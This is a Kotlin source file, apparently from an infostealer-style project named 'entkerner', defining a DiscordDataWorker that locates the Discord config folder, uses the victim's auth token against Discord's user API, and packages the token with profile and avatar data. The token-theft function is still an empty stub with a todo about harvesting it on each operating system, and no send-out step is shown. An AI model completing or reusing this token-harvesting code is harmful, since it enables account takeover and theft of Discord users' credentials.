package net.kerner.entkerner.extractors.discord

import io.ktor.client.*
import io.ktor.client.call.*
import io.ktor.client.request.*
import io.ktor.client.statement.*
import io.ktor.util.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.*
import net.kerner.entkerner.io.FileUtils.Linux.config
import net.kerner.entkerner.io.FileUtils.Linux.userHome
import net.kerner.entkerner.io.toBase64
import java.io.File
import java.util.Base64
import kotlin.io.path.div

private const val USER_INFORMATION_ENDPOINT = "https://discordapp.com/api/v6/users/@me"
private const val USER_AVATAR_ENDPOINT = "https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.webp"

class DiscordDataWorker(
        httpClient: HttpClient
) : AbstractDataExtractor<DiscordData>(httpClient) {
    override val name: String = "DiscordDataExtractionService"
    override val fileDirectories = object : SystemFileURI() {
        override val linux = config / "discord"
        override val windows = config
        override val xnu = config
    }

    private fun getToken(): String {
        return "" // todo: find a way to get the data windows is kinda easy but on linux and macOs, i have no idea how
    }

    override suspend fun extractData(file: File): DiscordData {
        val token = getToken()
        val userData: DiscordData = ioClient.get(USER_INFORMATION_ENDPOINT) {
            header("Authorization", token)
        }.body()
        userData.token = token
        userData.avatarString = ioClient.get(USER_AVATAR_ENDPOINT
                .replace("{user_id}", userData.id)
                .replace("{avatar_id}", userData.avatar)).bodyAsChannel().toByteArray().toBase64()
        return userData
    }
}